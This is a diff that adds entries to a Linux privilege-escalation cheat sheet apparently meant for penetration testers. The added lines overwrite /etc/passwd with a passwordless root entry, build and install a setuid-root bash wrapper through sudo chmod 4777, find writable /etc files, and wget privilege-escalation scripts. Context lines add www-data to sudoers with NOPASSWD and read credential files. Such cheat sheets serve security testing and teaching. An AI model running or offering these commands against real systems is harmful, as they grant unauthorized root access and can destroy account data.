@@ -87,6 +87,9 @@ Linux elevation of privileges, manual testing
     Find apps installed;
     *$ ls -alh /usr/bin/; ls -alh /sbin/; dpkg -l; rpm -qa; ls -alh /var/cache/apt/archivesO; ls -alh /var/cache/yum/*;*
 
+    Find writable configuration files
+    *$ find /etc/ -writable -type f 2>/dev/null*
+
     Missconfigured services
     *$ cat /etc/syslog.conf; cat /etc/chttp.conf; cat /etc/lighttpd.conf; cat /etc/cups/cupsd.conf; cat /etc/inetd.conf; cat /etc/apache2/apache2.conf; cat /etc/my.conf; cat /etc/httpd/conf/httpd.conf; cat /opt/lampp/etc/httpd.conf; ls -aRl /etc/ | awk '$1 ~ /^.*r.*/*
 
@@ -143,10 +146,14 @@ $ /usr/bin/foo
     If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:
     *$ chown root:root /tmp/setuid;chmod 4777 /tmp/setuid;*
 
+    If /etc/passwd has incorrect permissions, you can root:
+    * $ echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su*
 
     Add user www-data to sudoers with no password
     *$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update*
 
+    If you can sudo chmod:
+    * $echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c $ sudo chown root:root /tmp/setuid; sudo chmod 4777 /tmp/setuid; /tmp/setuid*
 
     Find other uses in the system
     * $id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l*
@@ -181,6 +188,9 @@ Scripts to run
     *wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh*
     *wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh*
     *wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl*
+    *wget  https://www.rebootuser.com/?p=1758
+    *wget http://www.securitysift.com/download/linuxprivchecker.py*
+    *wget https://github.com/pentestmonkey/unix-privesc-check*
 
 
 Exploits worth running
